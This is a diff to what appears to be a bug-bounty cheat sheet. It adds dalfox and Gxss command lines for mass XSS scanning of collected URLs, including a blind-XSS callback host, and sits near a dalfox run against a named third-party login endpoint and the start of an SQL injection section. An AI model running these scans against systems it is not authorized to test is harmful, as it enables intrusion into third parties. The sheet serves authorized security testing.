@@ -1049,6 +1049,10 @@ Hidden params
 - dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code
 https://hahwul.xss.ht
 
+- dalfox file urls.txt -b https://hahwul.xss.ht
+- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+- cat urls.txt | Gxss -c 100 -p XssReflected
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 SQLI 
 1- collect all urls with waybackurl , gau , hackcrawler in urls.txt
